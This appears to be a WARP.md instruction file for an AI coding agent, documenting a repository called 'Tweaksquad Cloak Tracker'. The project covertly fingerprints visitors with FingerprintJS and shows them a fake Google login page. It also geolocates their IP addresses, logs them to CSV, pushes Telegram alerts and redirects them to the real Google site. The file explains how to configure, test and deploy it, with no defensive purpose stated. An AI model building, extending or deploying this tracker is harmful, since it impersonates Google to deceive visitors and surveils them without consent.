# WARP.md

This file provides guidance to WARP (warp.dev) when working with code in this repository.

## Project Overview

Tweaksquad Cloak Tracker is a discreet visitor logging system that uses FingerprintJS to track visitors while presenting them with a fake Google login interface. The system logs visitor data, sends Telegram alerts, and can redirect visitors to legitimate sites.

## Key Architecture Components

### Core Files
- `tracker.html` - Main tracking page with fake Google login UI
- `logger.php` - Backend PHP script that processes visitor data, enriches with IP intelligence, and logs to CSV files
- `admin.html` - Administrative panel for viewing logs (requires Telegram unlock)
- `admin.php` - Contains access key for admin authentication
- `log.csv` - Primary visitor log file
- `redirect_log.csv` - Separate log for redirected visitors only

### Data Flow
1. Visitor lands on tracker.html → FingerprintJS generates unique visitor ID
2. JavaScript payload sent to logger.php with browser/device data
3. logger.php enriches data with IP geolocation (via ipapi.co)
4. Data logged to CSV files, Telegram alerts sent for new visitors
5. Visitor redirected to legitimate Google accounts page

### External Dependencies
- **FingerprintJS v3** - Browser fingerprinting via CDN
- **ipapi.co** - IP geolocation and ISP information
- **Telegram Bot API** - Real-time visitor alerts

## Development Commands

### Local PHP Server
```powershell
# Start local PHP development server
php -S localhost:8000

# Access tracker page
start http://localhost:8000/tracker.html

# Access admin panel  
start http://localhost:8000/admin.html
```

### Testing & Debugging
```powershell
# Test PHP syntax
php -l logger.php

# Check log file contents
Get-Content log.csv | Select-Object -Last 10

# Monitor logs in real-time
Get-Content log.csv -Wait -Tail 5

# Clear log files for testing
Remove-Item log.csv, redirect_log.csv -Force
```

### File Validation
```powershell
# Verify all core files exist
Get-ChildItem tracker.html, logger.php, admin.html, admin.php | Select-Object Name, Length

# Check PHP error log
php -f logger.php
```

## Deployment

### GitHub Pages (Static hosting only)
The project includes GitHub Actions workflow for automatic deployment to GitHub Pages. Note: PHP functionality requires separate hosting.

### Render.com Deployment
1. Set Runtime to PHP
2. Set Publish Directory to `public/` (move files there first)
3. Configure environment variables for Telegram bot token and chat ID

## Configuration

### Telegram Bot Setup
Edit `logger.php` to configure:
```php
$token = 'YOUR_BOT_TOKEN';    // From @BotFather
$chatId = 'YOUR_TELEGRAM_ID'; // Your user/chat ID
```

### Admin Access
Edit `admin.php` to set your access key:
```php
$access_key = 'mySecretKeyHere';
```

### Redirect Target
Modify redirect URL in `tracker.html`:
```javascript
window.location.href = 'https://accounts.google.com/'; // Change target
```

## Security Considerations

- Log files contain sensitive visitor data (IPs, browser info, fingerprints)
- Admin panel access controlled via Telegram bot commands
- Consider implementing log rotation for large-scale deployments
- IP intelligence API calls may have rate limits

## Troubleshooting

### Common Issues
- **Logger not receiving data**: Check CORS headers and PHP error logs
- **Telegram alerts not working**: Verify bot token and chat ID in logger.php
- **Admin panel locked**: Send `/unlockadmin` command to your Telegram bot
- **Missing IP data**: ipapi.co service may be down or rate-limited

### Debug Mode
Add error reporting to logger.php for development:
```php
error_reporting(E_ALL);
ini_set('display_errors', 1);
```